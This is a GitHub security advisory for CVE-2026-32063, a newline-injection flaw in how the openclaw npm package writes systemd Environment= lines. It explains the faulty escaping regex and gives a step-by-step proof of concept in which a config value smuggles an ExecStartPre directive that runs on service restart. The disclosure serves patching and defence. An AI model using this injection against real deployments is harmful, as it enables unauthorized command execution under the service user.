# [H] OpenClaw Improperly Neutralizes Line Breaks in systemd Unit Generation Enables Local Command Execution (Linux)

## Summary
Severity: High
Advisory: GHSA-vffc-f7r7-rx2w
CVE: CVE-2026-32063
CWE: CWE-77
Ecosystem: npm
CVSS: CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2026-03-03
Source: https://github.com/advisories/GHSA-vffc-f7r7-rx2w
Type: github-advisory

## Affected
- npm: `openclaw` — affected >=0 <2026.2.21

## Details
### Summary
A command injection vulnerability exists in OpenClaw’s Linux systemd unit generation path.
When rendering `Environment=` entries, attacker-controlled values are not rejected for CR/LF, and `systemdEscapeArg()` uses an incorrect whitespace-matching regex. This allows newline injection to break out of an `Environment=` line and inject standalone systemd directives (for example, `ExecStartPre=`). On service restart, the injected command is executed, resulting in local arbitrary command execution (local RCE) under the gateway service user.

---

### Details
The issue is in `src/daemon/systemd-unit.ts`:

- `renderEnvLines(...)` builds:
- `Environment=${systemdEscapeArg(`${key}=${value}`)}`
- No CR/LF validation is enforced for environment keys/values before writing unit lines.
- `systemdEscapeArg(...)` uses:
- `/[\\s"\\\\]/`
- In this regex, `\\s` is interpreted as a literal backslash + `s`, not a whitespace character class.
As a result, whitespace detection/quoting behavior is incorrect.
Because systemd parses unit files line-by-line, a newline inside an environment value can inject an additional directive line. Example rendered output:

```ini
Environment=INJECT=ok
ExecStartPre=/bin/touch /tmp/oc15789_rce
```

At restart time, systemd executes `ExecStartPre`, enabling command execution.

Relevant code path/components involved in exploitation chain:
- `src/daemon/systemd-unit.ts`
- `src/commands/daemon-install-helpers.ts`
- `src/config/env-vars.ts`
- `src/config/zod-schema.ts`

Trigger conditions:
1. Attacker can influence `config.env.vars` (directly or indirectly).
2. Install/reinstall path is invoked to write/update the unit.
3. Service restart occurs (`systemctl --user restart ...`).

---

### PoC
Environment: Linux host with systemd user services enabled.

1. Configure a malicious environment value in OpenClaw config (`config.env.vars`), including a newline and injected directive:
- Key: `INJECT`
- Value:
```text
ok
ExecStartPre=/bin/touch /tmp/oc15789_rce
```

2. Install/reinstall the gateway service (fixed port as requested):
```bash
openclaw gateway install --port 15789 --force
```

3. Inspect the generated user unit file (default path):
```bash
~/.config/systemd/user/openclaw-gateway.service
```
Verify that an injected standalone line exists:
```ini
ExecStartPre=/bin/touch /tmp/oc15789_rce
```

4. Reload and restart user service:
```bash
systemctl --user daemon-reload
```
```bash
systemctl --user restart openclaw-gateway.service
```

5. Confirm command execution side effect:
```bash
ls -l /tmp/oc15789_rce
```
---

### Impact
This is a local command execution vulnerability in OpenClaw’s systemd unit generation during install/reinstall flows.

- **Type:** Command injection via newline/directive injection in unit file generation.
- **Execution context:** Runs with the same privileges as the OpenClaw gateway service user.
- **Affected users:** Linux deployments using systemd user services where an attacker can control `config.env.vars` and trigger install/reinstall.

## Fix Commit(s)
- `61f646c41fb43cd87ed48f9125b4718a30d38e84`

## References
- https://github.com/openclaw/openclaw/security/advisories/GHSA-vffc-f7r7-rx2w
- https://nvd.nist.gov/vuln/detail/CVE-2026-32063
- https://github.com/openclaw/openclaw/commit/61f646c41fb43cd87ed48f9125b4718a30d38e84
- https://github.com/openclaw/openclaw
- https://www.vulncheck.com/advisories/openclaw-command-injection-via-newline-in-systemd-unit-generation
